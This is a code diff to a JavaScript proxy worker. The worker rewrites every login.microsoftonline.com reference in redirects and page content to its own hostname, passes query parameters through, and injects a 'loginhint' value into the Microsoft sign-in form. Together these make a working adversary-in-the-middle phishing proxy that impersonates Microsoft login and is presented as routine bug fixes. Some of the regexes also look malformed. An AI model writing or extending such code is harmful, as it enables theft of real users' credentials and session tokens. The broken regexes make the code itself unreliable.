@@ -55,9 +55,17 @@ async function handleProxy(request, pathSegments = []) {
     upstreamPath = UPSTREAM_PATH + pathSegments.join('/');
   }
 
-  // Build upstream URL
-  const upstreamUrl = `https://${UPSTREAM}${upstreamPath}${url.search}`;
-  console.log('Proxying to:', upstreamUrl);
+  // FIX: Build upstream URL with proper query parameter handling
+  const upstreamUrl = new URL(`https://${UPSTREAM}${upstreamPath}`);
+  
+  // Copy ALL query parameters from original request to upstream URL
+  url.searchParams.forEach((value, key) => {
+    upstreamUrl.searchParams.set(key, value);
+  });
+
+  console.log('Proxying to:', upstreamUrl.toString());
+  console.log('Query params:', Object.fromEntries(upstreamUrl.searchParams));
+  console.log('Login hint:', url.searchParams.get('loginhint'));
 
   // Build headers for upstream fetch
   const upstreamHeaders = new Headers();
@@ -106,20 +114,48 @@ async function handleProxy(request, pathSegments = []) {
 
   let upstreamResponse;
   try {
-    upstreamResponse = await fetch(upstreamUrl, opts);
+    upstreamResponse = await fetch(upstreamUrl.toString(), opts);
   } catch (error) {
     console.error('Upstream fetch error:', error);
     return new Response('Upstream error: ' + error.message, { status: 502 });
   }
 
-  // Handle redirects
+  // FIX: Enhanced redirect handling to preserve query parameters
   if ([301, 302, 303, 307, 308].includes(upstreamResponse.status)) {
     const location = upstreamResponse.headers.get('location');
     if (location) {
-      const modifiedLocation = location.replace(
+      let modifiedLocation = location;
+      
+      // Replace Microsoft domain in redirect location
+      modifiedLocation = modifiedLocation.replace(
         /https?:\/\/login\.microsoftonline\.com/gi, 
         `https://${url.hostname}`
       );
+      
+      // If redirect is relative, ensure it includes our domain and preserves query params
+      if (modifiedLocation.startsWith('/')) {
+        const redirectUrl = new URL(modifiedLocation, `https://${url.hostname}`);
+        // Preserve original query parameters in redirects
+        url.searchParams.forEach((value, key) => {
+          if (!redirectUrl.searchParams.has(key)) {
+            redirectUrl.searchParams.set(key, value);
+          }
+        });
+        modifiedLocation = redirectUrl.toString();
+      } else {
+        // For absolute URLs, still replace domain and preserve params
+        const redirectUrl = new URL(modifiedLocation);
+        url.searchParams.forEach((value, key) => {
+          if (!redirectUrl.searchParams.has(key)) {
+            redirectUrl.searchParams.set(key, value);
+          }
+        });
+        modifiedLocation = redirectUrl.toString().replace(
+          /https?:\/\/login\.microsoftonline\.com/gi, 
+          `https://${url.hostname}`
+        );
+      }
+      
       const responseHeaders = new Headers(upstreamResponse.headers);
       responseHeaders.set('location', modifiedLocation);
       return new Response(null, {
@@ -177,6 +213,24 @@ async function handleProxy(request, pathSegments = []) {
         .replace(/login\.microsoftonline\.com/gi, url.hostname)
         .replace(/https:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`)
         .replace(/http:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
+      
+      // FIX: Also enhance JavaScript to handle login hints if present in query params
+      const loginHint = url.searchParams.get('loginhint');
+      const prompt = url.searchParams.get('prompt');
+      
+      if (loginHint) {
+        // Replace login_hint in hidden form fields and JavaScript variables
+        modifiedText = modifiedText
+          .replace(/(<input[^>]*name="login"[^>]*value=")[^"]*("/gi, `$1${loginHint}$2`)
+          .replace(/(<input[^>]*name="loginhint"[^>]*value=")[^"]*("/gi, `$1${loginHint}$2`)
+          .replace(/(window\.loginHint\s*=\s*["'])[^"']*(["'])/gi, `$1${loginHint}$2`)
+          .replace(/(var\s+loginHint\s*=\s*["'])[^"']*(["'])/gi, `$1${loginHint}$2`);
+      }
+      
+      if (prompt) {
+        modifiedText = modifiedText
+          .replace(/(<input[^>]*name="prompt"[^>]*value=")[^"]*("/gi, `$1${prompt}$2`);
+      }
       
       responseBody = modifiedText;
     } catch (error) {
